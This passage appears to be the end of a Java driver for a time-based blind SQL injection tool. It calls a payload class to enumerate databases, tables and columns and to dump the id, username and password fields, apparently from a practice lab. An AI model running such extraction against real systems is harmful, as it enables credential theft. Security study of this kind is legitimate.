        TimeBlindPayloads test = new TimeBlindPayloads(url, method, pre, preWrong, suf, sufbk, params, injectingKey, normalparams1,normalparams2);
        //test.filterBoundarys();
        /*String db = test.getDatabaseAllIn();
        System.out.println("db:"+db);*/

        /*ArrayList<String> dbs = test.getAllDBAllIn();
        for (String db : dbs) {
            System.out.println(db);
        }*/

        /*ArrayList<String> tables = test.getTablesALlIn("security");
        for (String table : tables) {
            System.out.println(table);
        }*/
        /*ArrayList<String> cols = test.getColumnAllIn("security", "users");
        for (String col : cols) {
            System.out.println(col);
        }*/

        ArrayList<String> cols = new ArrayList<String>(){{
            add("id");
            add("username");
            add("password");
        }};
        boolean b = test.filterBoundarys();
        ArrayList<ArrayList<String>> datas = test.getDataAllIn("security", "username", cols);
        for (ArrayList<String> data : datas) {
            System.out.println(data);
        }

    }
}